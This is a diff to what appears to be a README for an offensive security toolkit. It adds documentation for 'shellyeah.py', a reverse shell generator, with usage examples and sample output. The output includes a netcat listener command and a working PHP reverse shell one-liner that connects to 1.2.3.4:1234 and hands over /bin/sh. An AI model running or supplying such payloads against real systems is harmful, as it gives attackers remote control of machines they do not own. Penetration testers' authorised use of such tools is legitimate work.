@@ -33,3 +33,32 @@ Options:
 -l, --list             Lists repos from which wordlists are fetched
 -u, --update           Fetches updates for wordlists (if available)
 ```
+
+## shellyeah.py
+`shellyeah.py` is a CLI tool for generating reverse shell commands.
+### Usage:
+```sh
+$ python3 shellyeah.py -a 127.0.0.1 -p 1234 -s "php exec"
+$ python3 shellyeah.py  # List parameters and available shell commands
+```
+
+#### Examples
+```sh
+$ python3 shellyeah.py -a 1.2.3.4 -p 1234 -s "php exec"
+
+ _______________________________________
+< Shell Yeah! - Reverse Shell Generator >
+ ---------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+Listener command:
+nc -lvnp 1234
+
+Reverse shell command:
+php -r '$sock=fsockopen("1.2.3.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
